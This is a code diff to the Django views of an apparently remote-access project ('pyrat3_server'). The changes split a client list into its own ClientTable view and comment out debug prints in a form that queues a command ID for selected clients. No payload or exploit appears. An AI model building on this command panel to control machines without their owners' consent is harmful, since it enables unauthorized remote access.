@@ -32,27 +32,23 @@ def get_unique_id(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 
-class Index(generic.ListView, generic.edit.FormMixin):
+class Index(generic.edit.FormView):
 
-    #model = Client
-    context_object_name = 'clients'
     template_name = 'pyrat3_server/index.html'
     form_class = ClientSendCommandForm
     initial = {'last_command_id': get_unique_id}
     success_url = 'index'
-
-    def get_queryset(self):
-
-        return Client.objects.all().order_by('-join_datetime')
 
     def post(self, request, *args, **kwargs):
 
         form_class = self.get_form_class()
         form = self.get_form(form_class)
         if form.is_valid():
+            #print('FORM VALID')
             for client_id in form.cleaned_data['client_id']:
-                print(form.cleaned_data)
-                print(client_id)
+                #print(form.cleaned_data)
+                #print(client_id)
+                #print(type(client_id))
                 #client = form.save(commit=False)
                 client = Client.objects.get(client_id=client_id)
                 client.last_command_id = form.cleaned_data['last_command_id']
@@ -62,7 +58,18 @@ class Index(generic.ListView, generic.edit.FormMixin):
                 client.save()
             return self.form_valid(form)
         else:
+            #print(form.cleaned_data)
             return self.form_invalid(form)
+
+
+class ClientTable(generic.ListView):
+
+    context_object_name = 'clients'
+    template_name = 'pyrat3_server/client_table.html'
+
+    def get_queryset(self):
+
+        return Client.objects.all().order_by('-join_datetime')
 
 
 class ClientList(views.APIView):
